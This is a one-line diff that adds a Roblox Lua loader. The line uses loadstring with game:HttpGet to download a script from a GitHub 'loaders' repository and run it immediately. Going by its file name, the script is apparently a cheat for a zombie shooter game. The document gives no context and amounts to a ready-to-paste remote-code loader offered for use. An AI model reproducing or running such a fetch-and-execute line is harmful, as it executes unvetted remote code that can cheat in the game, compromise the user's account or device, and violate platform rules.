@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/topprefectmatch/loaders/main/loaders/zombies-hypershot-spam1-f4bc025zo6m7n3.lua"))()
